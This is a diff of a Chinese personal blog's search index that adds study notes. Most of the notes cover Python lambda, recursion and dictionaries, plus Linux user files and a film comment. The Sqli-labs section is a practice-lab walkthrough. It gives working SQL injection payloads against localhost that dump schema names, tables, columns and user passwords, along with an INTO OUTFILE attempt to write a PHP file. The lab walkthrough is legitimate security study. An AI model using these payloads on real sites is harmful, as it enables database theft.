@@ -12,15 +12,43 @@
 
 <h2 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h2><h3 id="less-1-GET-Error-based-Single-quotes-String"><a href="#less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="less-1 GET - Error based - Single quotes - String"></a>less-1 GET - Error based - Single quotes - String</h3><p>(基于错误的GET单引号字符型注入)</p>
 <h4 id="查询（union）"><a href="#查询（union）" class="headerlink" title="查询（union）"></a>查询（union）</h4><p>当函数mysql_fetch_array只被调用了一次时，且想显示非第一行查询的数据库数据时，可以让第一行的查询结果为空，那么，非第一行（union右边）的查询结果自然就成了第一行。</p>
+<p><strong>union的作用是将两个sql语句进行联合。union前后的两个sql语句的选择列数要相同才可以（用order by查询行数） 。Union all与union 的区别是增加了去重的功能</strong></p>
 <h4 id="数据库连接函数"><a href="#数据库连接函数" class="headerlink" title="数据库连接函数"></a>数据库连接函数</h4><p>concat和concat_ws</p>
 <p>其中concat_ws的第一个参数是连接字符串的分隔符，还会用到group__concat(可以把查询出来的多行连接起来)</p>
 <h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><p>查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了</p>
 <h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>查表时也只能返回一个table，所以要用limit来控制结果集具体是哪一行</p>
+<h4 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,2,3 –+</p>
+<p>爆库：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(schema_name),3 from information_schema.schemata–+</p>
+<p>爆表：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
+<p>爆列：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+</p>
+<p>爆数据：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,username,password from users where id =3–+</p>
 <h3 id="less-2-GET-Error-based-Intiger-based"><a href="#less-2-GET-Error-based-Intiger-based" class="headerlink" title="less-2 GET - Error based - Intiger based"></a>less-2 GET - Error based - Intiger based</h3><p> (基于错误的GET整型注入)</p>
 <p>跟less1一样，只是不用闭合‘</p>
+<h4 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> –+</p>
+<p>or</p>
+<p><a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> or 1=1</p>
+<p><a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> or 1=1–+</p>
 <h3 id="less-3-GET-Error-based-Single-quotes-with-twist-string"><a href="#less-3-GET-Error-based-Single-quotes-with-twist-string" class="headerlink" title="less-3 GET - Error based - Single quotes with twist string"></a>less-3 GET - Error based - Single quotes with twist string</h3><p>(基于错误的GET单引号变形字符型注入)</p>
 <p>多了 <strong>‘)</strong> 那么sql语句里的id 应该就是 (‘$id’) 这样！</p>
-<h3 id="less-3-GET-Error-based-Double-Quotes-String"><a href="#less-3-GET-Error-based-Double-Quotes-String" class="headerlink" title="less-3 GET - Error based - Double Quotes - String"></a>less-3 GET - Error based - Double Quotes - String</h3><p>（基于错误的GET双引号字符型注入） </p>
+<h4 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-3/index.php/?id=1′" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1′</a>) –+</p>
+<p>or</p>
+<p><a href="http://localhost/sqli-labs/Less-3/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1</a>‘) or ‘1’=(‘1’</p>
+<p><a href="http://localhost/sqli-labs/Less-3/index.php/?id=1′" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1′</a>) –+</p>
+<h3 id="less-4-GET-Error-based-Double-Quotes-String"><a href="#less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="less-4 GET - Error based - Double Quotes - String"></a>less-4 GET - Error based - Double Quotes - String</h3><p>(基于错误的GET双引号字符型注入) </p>
+<p>php中双引号可以包含单引号，所以判断是否存在注入时，还需要用 <strong>“</strong> 来判断</p>
+<h4 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-4/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1</a>“) –+</p>
+<p>or</p>
+<p><a href="http://localhost/sqli-labs/Less-4/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1</a>“) or “1”=(“1</p>
+<h3 id="less-5-GET-Double-Injection-Single-Quotes-String"><a href="#less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="less-5 GET - Double Injection - Single Quotes - String"></a>less-5 GET - Double Injection - Single Quotes - String</h3><p>(双注入GET单引号字符型注入)</p>
+<h3 id="less-6-GET-Double-Injection-Double-Quotes-String"><a href="#less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="less-6 GET - Double Injection - Double Quotes - String"></a>less-6 GET - Double Injection - Double Quotes - String</h3><p>(双注入GET双引号字符型注入)</p>
+<h3 id="less-7-GET-Dump-into-outfile-String"><a href="#less-7-GET-Dump-into-outfile-String" class="headerlink" title="less-7 GET - Dump into outfile - String"></a>less-7 GET - Dump into outfile - String</h3><p>(导出文件GET字符型注入)</p>
+<p>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</p>
+<p>outfile函数将数据库中的内容写到一个文件中</p>
+<p>dumpfile只能使用一行</p>
+<p>load_file函数用来从文件系统中将文件导入到mysql中</p>
+<p>虽然有相应数据库权限，也对路径进行了转义，但是还是没有成功导出文件，尝试导出在tmp文件夹，发现也不行。先放着吧！</p>
+<p><a href="http://localhost/sqli-labs/Less-7/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-7/index.php/?id=1</a>‘)) union select 1,2,3 into outfile “C:\phpStudy\tmp\1.php” %23 </p>
+<h3 id="less-8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="less-8 GET - Blind - Boolian Based - Single Quotes"></a>less-8 GET - Blind - Boolian Based - Single Quotes</h3><p>(布尔型单引号GET盲注)</p>
 </the></excerpt>]]></content>
       
         <categories>
@@ -164,6 +192,7 @@
 <li>猜想一下 min() 这个 BIF 的实现过程</li>
 <li>视频中我们说 sum() 这个 BIF 有个缺陷，就是如果参数里有字符串类型的话就会报错，请写出一个新的实现过程，自动“无视”参数里的字符串并返回正确的计算结果</li>
 </ol>
+<p><a href="http://bbs.fishc.com/thread-64640-1-1.html" target="_blank" rel="noopener">1-16讲阶段性总结</a></p>
 <h2 id="17-函数：Python的乐高积木"><a href="#17-函数：Python的乐高积木" class="headerlink" title="17.函数：Python的乐高积木"></a>17.函数：Python的乐高积木</h2><h3 id="用函数的好处"><a href="#用函数的好处" class="headerlink" title="用函数的好处"></a>用函数的好处</h3><h3 id="函数的意义"><a href="#函数的意义" class="headerlink" title="函数的意义"></a>函数的意义</h3><p>函数是实现某一特定功能的一组代码的打包，它通过参数与外界交互（也可以不需要参数而执行某一特定功能）并返回处理后的结果（也可以只返回一个空）。在Python程序内，函数——&gt;类对象——&gt;模块是最基础和重要的部分，是入门必备的知识，没有之一！！！</p>
 <h3 id="函数的定义和调用"><a href="#函数的定义和调用" class="headerlink" title="函数的定义和调用"></a>函数的定义和调用</h3><p>def functionname1():</p>
 <p>​    函数内容</p>
@@ -210,7 +239,50 @@
 <h3 id="内嵌函数"><a href="#内嵌函数" class="headerlink" title="内嵌函数"></a>内嵌函数</h3><p>内嵌函数指的是在一个函数体内部定义的函数，可以称它为函数的函数。这个时候就牵涉到了函数体内部变量作用域的问题了,为了区分这两个函数，在这里我们将内嵌函数称为子函数，而将其外部的函数称为母函数。与全局变量和局部变量的关系一样：子函数体内定义的变量只在其函数体内部有效，但其内部却可以引用母函数体内定义的变量，但是却仍无法直接修改母函数体内定义的变量</p>
 <h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>闭包是一种满足特定要求的内嵌函数。这里我们还是将内嵌函数称为子函数，其外部的函数称为母函数，则当子函数体内有对母函数体内定义的变量的引用时我们称这个子函数为一个闭包。但当母函数和其闭包都定义了参数时，由于在母函数体外是无法直接对闭包进行函数调用的，为了能够实现对闭包的调用，需要在母函数内增加一条返回闭包函数名本身的语句，这个时候调用母函数后返回的是一个闭包的函数对象，就可以通过这种方法间接调用闭包函数了</p>
 <h3 id="在内嵌函数内修改外部函数内定义的变量的值"><a href="#在内嵌函数内修改外部函数内定义的变量的值" class="headerlink" title="在内嵌函数内修改外部函数内定义的变量的值"></a>在内嵌函数内修改外部函数内定义的变量的值</h3><p><strong>前面已经讲过，无法直接在闭包内部对外部函数的变量进行修改，但是如果真的非要修改的话，在Python3里面是可以的，需要增加一条声明此变量是外部函数内变量的语句nonlocal</strong></p>
-<h2 id="21-函数：lambda表达式"><a href="#21-函数：lambda表达式" class="headerlink" title="21.函数：lambda表达式"></a>21.函数：lambda表达式</h2><h2 id="22-函数：递归是神马"><a href="#22-函数：递归是神马" class="headerlink" title="22.函数：递归是神马"></a>22.函数：递归是神马</h2><h2 id="23-递归：这帮小兔崽子"><a href="#23-递归：这帮小兔崽子" class="headerlink" title="23.递归：这帮小兔崽子"></a>23.递归：这帮小兔崽子</h2></the></excerpt>]]></content>
+<h2 id="21-函数：lambda表达式"><a href="#21-函数：lambda表达式" class="headerlink" title="21.函数：lambda表达式"></a>21.函数：lambda表达式</h2><p>lambda表达式 -&gt; 匿名函数</p>
+<p>两个重要BIF</p>
+<p>1）filter(function or None,iterable)：两个参数为函数和可迭代的序列，函数定义了过滤的规则，默认过滤出真的部分。<br>2）map(function or None,iterable)：同filter()的两个参数相同，这个内置函数的作用是：将序列的每一个元素作为函数的参数进行运算加工，直到可迭代序列的每个元素都加工完毕，返回所有加工后的元素构成的新序列。</p>
+<p><strong>Exercise</strong></p>
+<ol>
+<li>请使用lambda表达式将下边函数转变为匿名函数？</li>
+<li>请将下边的匿名函数转变为普通函数？</li>
+<li>用filter()函数和lambda表达式快速求出100以内所有3的倍数？</li>
+<li>还记得zip函数吗？</li>
+<li>​</li>
+</ol>
+<h2 id="22-函数：递归是神马"><a href="#22-函数：递归是神马" class="headerlink" title="22.函数：递归是神马"></a>22.函数：递归是神马</h2><p><strong>1.递归的含义和一些用途</strong><br>​        递归就是函数通过return语句实现自己调用自己的过程，基本上所有程序语言都有递归算法，他的重要性体现在‘一般程序员使用迭代，而天才程序员使用递归’这句话上，我们的的汉诺塔游戏的解法，树状数以及谢尔宾斯基三角形都用到了递归的思想。<br><strong>2. 递归的深度和设定递归深度的函数</strong><br>​        在Python3中针对递归提供了程序保护机制，默认允许的递归深度是100层，而如果我们需要使用网络爬虫等需要远远超过百次的递归层数时，就需要去修改程序默认的递归深度以满足要求。设置递归深度的函数为在sys模块里面的settrecursionlimit()函数进行设置。</p>
+<h2 id="23-递归：这帮小兔崽子"><a href="#23-递归：这帮小兔崽子" class="headerlink" title="23.递归：这帮小兔崽子"></a>23.递归：这帮小兔崽子</h2><p>斐波那契数列</p>
+<p>递归方法是一个双刃剑，用好了能解决很棘手的问题，例如汉诺塔游戏的解法实现，而用不好将会使得程序执行效率降低，例如上述实现斐波那契数列方法中，如果月数为35，则采用递归程序计算起来就慢多了，而迭代则瞬间计算完，虽然递归书写代码很简洁。</p>
+<h2 id="24-递归：汉诺塔"><a href="#24-递归：汉诺塔" class="headerlink" title="24.递归：汉诺塔"></a>24.递归：汉诺塔</h2><p><strong>汉诺塔游戏的基本规则</strong><br>​        汉诺塔游戏有三根柱子，分别为x,y,z。已知初始时在x柱子上有n个盘子，盘子大小各不相同，且大的在下，小的在上；要求将这n个盘子按同样顺序叠放到z柱子上，且要求每次只能转移一个盘子，且盘子在柱子上的顺序必须保证大的在下，小的在上。<br><strong>递归算法实现汉诺塔游戏思路</strong><br>​        递归算法的思想是“分制”方法，即将一个复杂问题分解为几个较复杂问题，再继续讲较复杂问题继续分解为次较复杂问题，继续将次较复杂问题往下分解直到分解为一个能直接解决的简单问题，然后再回过去。这里，我们用递归方法解决汉诺塔游戏的思路如下：<br>​        将n个盘子从x柱子转移到z柱子问题分解为三个问题：1）将x柱子顶上的n-1个盘子转移到y柱子上；2）将x柱子最后一个盘子转移到z柱子上；3）将<br>​        y柱子上的n-1个盘子转移到z柱子上。<br>​        依次将问题分解下去。。。。。。</p>
+<p>虽然明白递归，但是，对汉诺塔这个，实在是还没搞懂～ :(</p>
+<p><a href="http://bbs.fishc.com/thread-65416-1-1.html" target="_blank" rel="noopener">17-24讲阶段性总结</a></p>
+<h2 id="25-字典：当索引不好用时"><a href="#25-字典：当索引不好用时" class="headerlink" title="25.字典：当索引不好用时"></a>25.字典：当索引不好用时</h2><p>字典是映射类型。字典的定义形式为：字典变量名 = {key1:value1,key2:value2….}。这里面key代表索引值，而value代表映射的值，通过大括号将其括起来进行字典的定义。访问字典时直接以字典变量名[key]进行访问</p>
+<p><strong>dict()函数的用法</strong><br>​        <strong>创建一个空字典，举例说明：</strong></p>
+<p>dict3 = dict()</p>
+<p>​    <strong>通过将key和value作为一个序列类型（元组或列表）创建一个字典。举例说明：</strong></p>
+<p>dict4 = dict(((‘李宁’,’一切皆有可能’),(‘鱼C工作室’,’让编程改变世界’)))</p>
+<p>​    <strong>通过对关键字赋值创建一个字典，注意关键字必须是一个字符串类型且不能加引号，因为程序会默认为其加上一个引号，举例说明：</strong></p>
+<p>dict5 = dict(李宁=’一切皆有可能’, 鱼C工作室=’让编程改变世界’)</p>
+<p>​    <strong>修改或添加字典元素</strong></p>
+<p>通过将变量赋值给字典访问类修改或者增加字典的元素，举例说明：</p>
+<p>dict6 = {‘李宁’: ‘一切皆有可能’, ‘鱼C工作室’: ‘让编程改变世界’}<br>dict6[‘李宁’] = ‘打造民族品牌’</p>
+<p><strong>当key值存在于字典内时，则重置key的value值</strong></p>
+<p><strong>当key值不存在于字典内时，则字典增加一个相（key:value）</strong></p>
+<h2 id="26-字典：当索引不好用时2"><a href="#26-字典：当索引不好用时2" class="headerlink" title="26.字典：当索引不好用时2"></a>26.字典：当索引不好用时2</h2><p><strong>fromkeys(iterable, value=None, /) </strong> </p>
+<p>创建并返回一个新的字典。其中第一个参数是一个可迭代对象（序列类型），第二个参数是value值，当第二个参数不提供时，则默认为none</p>
+<p>访问字典的内置函数，这里主要是访问字典的key的keys()，访问字典的value的values()，访问item的items()。当然也可以直接用get()通过key访问其对应的value。</p>
+<p><strong>get(k[,d])</strong></p>
+<p>通过key返回对应的value值，第一个参数为key值，第二个参数为默认返回的value值，当key存在则返回对应的value，不存在字典内时返回该值，如果不提供则默认为none</p>
+<p><strong>清空字典和复制一个字典函数clear()和copy()。</strong></p>
+<p>这里面主要要搞清楚copy()和=赋值的区别，copy()相当于复制出一个新的字典，两者互不影响，而赋值=仅是将字典内存地址赋值出去，两者共同指向一个地址</p>
+<p><strong>去除字典一个元素内置函数 pop()、popitem()</strong></p>
+<p>pop(k[,d])当k存在字典的key时，在字典内去除该key对应的（key,value），否则返回d的值，当d不提供时返回错误</p>
+<p>popitem()去除字典内的一个（key,value），如果字典本身为空时报错</p>
+<p><strong>setdefault()</strong></p>
+<p>给字典增加一个item，setdefault(k[,d])，返回k对应的value值，当k不在字典内时则返回d的值，如果d没提供则返回空；同时如果k不存在字典内时，将d作为value映射给k</p>
+<p><strong>update()</strong></p>
+<p>update([E, ]**F) -&gt; None.  Update D from dict/iterable E and F.将一个字典内的item作为item添加到字典内</p>
+</the></excerpt>]]></content>
       
         <categories>
             
@@ -608,7 +680,26 @@
 <h3 id="脚本安装包与软件包选择"><a href="#脚本安装包与软件包选择" class="headerlink" title="脚本安装包与软件包选择"></a>脚本安装包与软件包选择</h3><p>脚本安装包类似于windows下软件的安装方式</p>
 <p>Webmin是一个基于Web的Linux系统管理界面</p>
 <h2 id="用户和用户组管理"><a href="#用户和用户组管理" class="headerlink" title="用户和用户组管理"></a>用户和用户组管理</h2><h3 id="用户配置文件"><a href="#用户配置文件" class="headerlink" title="用户配置文件"></a>用户配置文件</h3><h4 id="用户信息文件-etc-passwd"><a href="#用户信息文件-etc-passwd" class="headerlink" title="用户信息文件 /etc/passwd"></a>用户信息文件 /etc/passwd</h4><p>第一字段：用户名称<br>第二字段：密码标志<br>第三字段：UID（用户ID）<br>​    0：超级用户<br>​    1-499：系统用户（伪用户）<br>​    500-65535：普通用户<br>第四字段：GID（用户组初始ID）<br>第五字段：用户说明<br>第六字段：家目录<br>​    普通用户：/home/用户名/<br>​    超级用户：/root/<br>第七字段：登录之后的Shell（命令解释器）</p>
-<h4 id="影子文件-etc-shadow"><a href="#影子文件-etc-shadow" class="headerlink" title="影子文件 /etc/shadow"></a>影子文件 /etc/shadow</h4><h4 id="组信息文件-etc-group-和密码文件-etc-gshadow"><a href="#组信息文件-etc-group-和密码文件-etc-gshadow" class="headerlink" title="组信息文件 /etc/group 和密码文件 /etc/gshadow"></a>组信息文件 /etc/group 和密码文件 /etc/gshadow</h4></the></excerpt>]]></content>
+<h4 id="影子文件-etc-shadow"><a href="#影子文件-etc-shadow" class="headerlink" title="影子文件 /etc/shadow"></a>影子文件 /etc/shadow</h4><p>第一字段：用户名<br>第二字段：加密密码<br>​    加密算法升级为SHA512散列加密算法<br>​    如果密码位是“!!“或“*”代表没有密码，不能登录<br>第三字段：密码最后一次修改日期<br>​    使用1970年1月1日作为标准时间，每过一天时间戳加1<br>第四字段：两次密码的修改时间间隔（和第三字段相比）<br>第五字段：密码有效期（与第三字段相比）<br>第六字段：密码修改到期前的警告天数（和第五字段相比）<br>第七字段：密码过期后的宽限天数（和第五字段相比）<br>​    0:代表密码过期后立即失效<br>​    -1:则代表密码永远不会失效<br>第八字段：账号失效时间<br>​    要用时间戳表示<br>第九字段：保留<br>时间戳的换算：<br>​    把时间戳换算为日期<br>​        date -d “1970-01-01 16066 days”<br>​    把日期换算成时间戳<br>​        echo $(($(date —date=”2014/01/06” +%s)/86400+1))</p>
+<h4 id="组信息文件-etc-group-和密码文件-etc-gshadow"><a href="#组信息文件-etc-group-和密码文件-etc-gshadow" class="headerlink" title="组信息文件 /etc/group 和密码文件 /etc/gshadow"></a>组信息文件 /etc/group 和密码文件 /etc/gshadow</h4><p><strong>组信息文件</strong><br>第一字段：组名<br>第二字段：组密码标志<br>第三字段：GID<br>第四字段：组中附加用户<br><strong>组密码文件</strong><br>第一字段：组名<br>第二字段：组密码<br>第三字段：组管理员用户名<br>第四字段：组中附加用户</p>
+<h3 id="用户管理相关文件"><a href="#用户管理相关文件" class="headerlink" title="用户管理相关文件"></a>用户管理相关文件</h3><h4 id="用户的家目录"><a href="#用户的家目录" class="headerlink" title="用户的家目录"></a>用户的家目录</h4><p>普通用户：/home/用户名/ ，所有者和所属组都是此用户，权限是700</p>
+<p>超级用户：/root/ ，所有者和所属猪都是root用户，权限是500</p>
+<h4 id="用户的邮箱"><a href="#用户的邮箱" class="headerlink" title="用户的邮箱"></a>用户的邮箱</h4><p>/var/spool/mail/用户名/</p>
+<h4 id="用户模版目录"><a href="#用户模版目录" class="headerlink" title="用户模版目录"></a>用户模版目录</h4><p>/etc/skel/</p>
+<h3 id="用户管理命令-1"><a href="#用户管理命令-1" class="headerlink" title="用户管理命令"></a>用户管理命令</h3><h4 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h4><p><strong>grammar: useradd [选项] 用户名</strong></p>
+<p>-u UID: 手工指定用户的UID号</p>
+<p>-d 家目录: 手工指定用户的家目录</p>
+<p>-c 用户说明: 手工指定用户的说明</p>
+<p>-g 组名: 手动指定用户的初始组</p>
+<p>-G 组名: 指定用户的附加组</p>
+<p>-s shell: 手工指定用户的登录shell，默认是/bin/bash</p>
+<p>指定选项添加用户，有以上选项</p>
+<h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><p><strong>grammar: passwd [选项] 用户名</strong></p>
+<p>-S : 查询用户密码的密码状态。仅root用户可用</p>
+<p>-l : 暂时锁定用户。仅root用户可用</p>
+<p>-u : 解锁用户。仅root用户可用</p>
+<p>—stdin 可以通过管道符输出的数据作为用户的密码。</p>
+</the></excerpt>]]></content>
       
         <categories>
             
@@ -703,6 +794,7 @@
 <p><strong>这部片，值得多刷</strong></p>
 <p>更多细致影评：<a href="https://www.zhihu.com/question/35875851" target="_blank" rel="noopener">如何评价《实习生》（The Intern）这部电影？</a></p>
 <h3 id="前任3-再见前任"><a href="#前任3-再见前任" class="headerlink" title="前任3-再见前任"></a>前任3-再见前任</h3><p>​    我好像1-2-3，都看了～感觉除了虐还是虐～催泪部分都给我免疫了～～emm～～</p>
+<h3 id="Paterson-帕特森"><a href="#Paterson-帕特森" class="headerlink" title="Paterson 帕特森"></a>Paterson 帕特森</h3><p>一部平淡的文艺片～</p>
 </the>]]></content>
       
         <categories>
